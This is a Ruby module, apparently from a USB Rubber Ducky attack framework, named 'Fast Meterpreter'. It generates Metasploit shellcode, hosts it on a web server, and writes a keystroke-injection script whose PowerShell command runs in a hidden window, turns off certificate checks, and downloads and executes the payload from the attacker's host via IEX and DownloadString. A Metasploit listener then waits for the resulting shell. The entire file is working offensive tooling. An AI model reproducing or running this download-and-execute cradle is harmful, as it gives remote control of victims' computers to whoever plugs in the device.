#!/usr/bin/env ruby
require 'skeleton'
require 'metasploit'
class FastMeterpreter < Skeleton
  include Msf::Options
  attr_reader :ducky
  self.title = 'Fast Meterpreter'
  self.description = 'Download and Execute meterpreter shellcode '
  description << 'from a web server'

  def setup
    @msf = Msf::MsfCommands.new
    @host = @server_setup.host
    @port = @server_setup.port
    @ssl = @server_setup.use_ssl?
    @payload = @msf.payload_select
    @msf_host = msf_host
    @msf_port = msf_port
  end

  def run
    shellcode = @msf.generate_shellcode(@msf_host, @msf_port, @payload)
    server = Server::Start.new(@ssl, @host, @port)
    Thread.new { server.ruby_web(shellcode) } if @server_setup.host_payload?
  end

  def finish
    priv_choice = @ducky_writer.menu
    File.open("#{text_path}#{@file_name}.txt", 'w') do |f|
      f.write(@ducky_writer.write(priv_choice))
      @ssl ? f.write(powershell_command("https://#{@host}:#{@port}")) :
        f.write(powershell_command("http://#{@host}:#{@port}"))
    end
    Ducky::Compile.new("#{@file_name}.txt")
    @msf.start(@msf_host, @msf_port) if @msf.start_metasploit?
  end

  private

  def powershell_command(url)
    psh = 'powershell -windowstyle hidden [System.Net.ServicePointManager]::'
    psh << 'ServerCertificateValidationCallback = { $true };IEX (New-Object '
    psh << "Net.WebClient).DownloadString('#{url}'))"
  end
end
